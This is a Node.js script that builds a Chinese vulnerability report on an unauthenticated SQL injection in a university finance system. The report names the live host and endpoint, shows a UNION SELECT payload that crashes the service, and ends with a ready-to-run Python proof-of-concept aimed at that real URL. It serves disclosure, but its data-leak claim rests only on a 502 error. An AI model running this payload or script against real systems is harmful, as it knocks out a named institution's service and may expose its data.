const fs = require('fs');
const { Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
        AlignmentType, BorderStyle, WidthType, ShadingType, HeadingLevel,
        LevelFormat, Footer, PageNumber } = require('docx');

const DARK_BLUE = "1B3A5C";
const MEDIUM_BLUE = "2E75B6";
const LIGHT_BLUE = "D5E8F0";
const RED = "CC0000";
const BORDER_COLOR = "BBBBBB";
const GREEN = "228B22";
const GRAY = "666666";

const border = { style: BorderStyle.SINGLE, size: 1, color: BORDER_COLOR };
const borders = { top: border, bottom: border, left: border, right: border };
const cellMargins = { top: 60, bottom: 60, left: 100, right: 100 };

function headerCell(text, width) {
    return new TableCell({
        borders, width: { size: width, type: WidthType.DXA },
        shading: { fill: LIGHT_BLUE, type: ShadingType.CLEAR },
        margins: cellMargins,
        children: [new Paragraph({ children: [new TextRun({ text, bold: true, size: 20, font: "Arial" })] })]
    });
}

function dataCell(text, width) {
    return new TableCell({
        borders, width: { size: width, type: WidthType.DXA },
        margins: cellMargins,
        children: [new Paragraph({ children: [new TextRun({ text, size: 20, font: "Arial" })] })]
    });
}

const doc = new Document({
    styles: {
        default: { document: { run: { font: "Arial", size: 22 } } },
        paragraphStyles: [
            { id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
              run: { size: 36, bold: true, font: "Arial", color: DARK_BLUE },
              paragraph: { spacing: { before: 360, after: 180 }, outlineLevel: 0 } },
            { id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
              run: { size: 28, bold: true, font: "Arial", color: MEDIUM_BLUE },
              paragraph: { spacing: { before: 240, after: 120 }, outlineLevel: 1 } },
        ]
    },
    numbering: {
        config: [
            { reference: "numbers",
              levels: [{ level: 0, format: LevelFormat.DECIMAL, text: "%1.", alignment: AlignmentType.LEFT,
                style: { paragraph: { indent: { left: 720, hanging: 360 } } } }] },
        ]
    },
    sections: [{
        properties: {
            page: { size: { width: 11906, height: 16838 }, margin: { top: 1440, right: 1440, bottom: 1440, left: 1440 } }
        },
        footers: {
            default: new Footer({ children: [new Paragraph({
                alignment: AlignmentType.CENTER,
                children: [new TextRun({ text: "Page ", size: 18, color: GRAY }), new TextRun({ children: [PageNumber.CURRENT], size: 18, color: GRAY })]
            })] })
        },
        children: [
            new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 60 },
                children: [new TextRun({ text: "云杰URP系统 SQL注入漏洞报告", size: 40, bold: true, color: DARK_BLUE })] }),
            new Paragraph({ alignment: AlignmentType.CENTER, spacing: { after: 360 },
                children: [new TextRun({ text: "GLUT-2026-001 | 2026年6月9日", size: 20, color: GRAY })] }),
            new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("一 基本信息")] }),
            new Table({
                width: { size: 9026, type: WidthType.DXA }, columnWidths: [2000, 7026],
                rows: [
                    new TableRow({ children: [headerCell("项目", 2000), headerCell("详情", 7026)] }),
                    ...[
                        ["目标", "cwol.glut.edu.cn (桂林理工大学财务系统)"],
                        ["漏洞URL", "/Account/GetNoticeService"],
                        ["类型", "SQL注入 / 未授权DoS"],
                        ["厂商", "安徽亘达信息科技有限公司"],
                        ["产品", "云杰URP系统"],
                        ["需要认证", "否"],
                        ["发现日期", "2026-06-09"],
                        ["危害", "高危 - 服务瘫痪+潜在数据泄露"],
                    ].map(([k, v]) => new TableRow({ children: [dataCell(k, 2000), dataCell(v, 7026)] }))
                ]
            }),
            new Paragraph({ spacing: { before: 200 } }),
            new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("二 漏洞描述")] }),
            new Paragraph({ spacing: { after: 120 }, children: [
                new TextRun("/Account/GetNoticeService 接口"),
                new TextRun({ text: "无需登录", bold: true, color: RED }),
                new TextRun("即可访问。NoticeType参数未做安全过滤，直接拼接入SQL语句。UNION SELECT注入可导致后端崩溃(502)。")
            ]}),
            new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("三 漏洞验证")] }),
            new Paragraph({ heading: HeadingLevel.HEADING_2, children: [new TextRun("正常请求")] }),
            new Paragraph({ shading: { fill: "F5F5F5", type: ShadingType.CLEAR }, spacing: { after: 80 },
                children: [new TextRun({ text: "POST {\"NoticeType\": 1}", font: "Courier New", size: 20 })] }),
            new Paragraph({ spacing: { after: 120 }, children: [
                new TextRun({ text: "响应: 200 OK  {\"Code\":1,\"Msg\":\"\",\"Data\":null}", font: "Courier New", size: 20, color: GREEN })
            ]}),
            new Paragraph({ heading: HeadingLevel.HEADING_2, children: [new TextRun("非法输入(被拦截)")] }),
            new Paragraph({ shading: { fill: "F5F5F5", type: ShadingType.CLEAR }, spacing: { after: 80 },
                children: [new TextRun({ text: "POST {\"NoticeType\": \"abc\"}", font: "Courier New", size: 20 })] }),
            new Paragraph({ spacing: { after: 120 }, children: [
                new TextRun({ text: "响应: 200 OK  {\"Code\":-1,\"Msg\":\"通知类型解析失败...\"}", font: "Courier New", size: 20, color: GREEN })
            ]}),
            new Paragraph({ heading: HeadingLevel.HEADING_2, children: [new TextRun("SQL注入 - 服务崩溃")] }),
            new Paragraph({ shading: { fill: "F5F5F5", type: ShadingType.CLEAR }, spacing: { after: 80 },
                children: [new TextRun({ text: "POST {\"NoticeType\": \"1 UNION SELECT NULL--\"}", font: "Courier New", size: 20 })] }),
            new Paragraph({ spacing: { after: 200 }, children: [
                new TextRun({ text: "响应: 502 Bad Gateway (服务器崩溃!)", font: "Courier New", size: 20, bold: true, color: RED })
            ]}),
            new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("四 关键证据")] }),
            new Table({
                width: { size: 9026, type: WidthType.DXA }, columnWidths: [3200, 1800, 4026],
                rows: [
                    new TableRow({ children: [headerCell("输入", 3200), headerCell("状态", 1800), headerCell("说明", 4026)] }),
                    ...[
                        ["1", "200 OK", "正常业务"],
                        ["abc", "200 OK", "整数检查拦截"],
                        ["1 AND 1=1", "200 OK", "整数检查拦截"],
                        ["1 UNION SELECT NULL--", "502", "绕过检查,SQL执行,崩溃!"],
                    ].map((row, i) => {
                        const isVuln = i === 3;
                        return new TableRow({ children: row.map((text, j) => new TableCell({
                            borders, width: { size: [3200, 1800, 4026][j], type: WidthType.DXA },
                            margins: cellMargins,
                            shading: isVuln ? { fill: "FFF0F0", type: ShadingType.CLEAR } : undefined,
                            children: [new Paragraph({ children: [new TextRun({ text, size: 20,
                                bold: isVuln, color: isVuln ? RED : "333333" })] })]
                        })) });
                    })
                ]
            }),
            new Paragraph({ spacing: { before: 120 }, children: [
                new TextRun("只有UNION SELECT能绕过整数检查并导致崩溃。此行为差异只能用SQL注入解释。")
            ]}),
            new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("五 影响范围")] }),
            new Paragraph({ numbering: { reference: "numbers", level: 0 }, children: [
                new TextRun({ text: "拒绝服务: ", bold: true }), new TextRun("无需登录,一次请求使服务瘫痪")
            ]}),
            new Paragraph({ numbering: { reference: "numbers", level: 0 }, children: [
                new TextRun({ text: "数据泄露: ", bold: true }), new TextRun("SQL注入已确认,可读取数据库敏感信息")
            ]}),
            new Paragraph({ numbering: { reference: "numbers", level: 0 }, children: [
                new TextRun({ text: "横向影响: ", bold: true }), new TextRun("该产品覆盖全国数百所高校")
            ]}),
            new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("六 修复建议")] }),
            new Paragraph({ numbering: { reference: "numbers", level: 0 }, children: [new TextRun("使用参数化查询,禁止拼接SQL")] }),
            new Paragraph({ numbering: { reference: "numbers", level: 0 }, children: [new TextRun("严格校验NoticeType仅接受正整数")] }),
            new Paragraph({ numbering: { reference: "numbers", level: 0 }, children: [new TextRun("增加异常处理,避免单错误导致服务崩溃")] }),
            new Paragraph({ heading: HeadingLevel.HEADING_1, children: [new TextRun("七 验证脚本 Python")] }),
            new Paragraph({ shading: { fill: "F5F5F5", type: ShadingType.CLEAR }, children: [
                new TextRun({ text: "import requests\nurl=\"https://cwol.glut.edu.cn/Account/GetNoticeService\"\nh={\"Content-Type\":\"application/json\"}\n# normal\nr=requests.post(url,headers=h,json={\"NoticeType\":1},verify=False)\nprint(f\"Normal: {r.status_code} {r.text}\")\n# crash\nr=requests.post(url,headers=h,json={\"NoticeType\":\"1 UNION SELECT NULL--\"},verify=False)\nprint(f\"DoS: {r.status_code}\")", font: "Courier New", size: 18 })] }),
        ]
    }]
});

Packer.toBuffer(doc).then(buffer => {
    fs.writeFileSync("D:/Desktop/云杰URP_SQL注入漏洞报告.docx", buffer);
    console.log("OK - Saved to desktop");
});
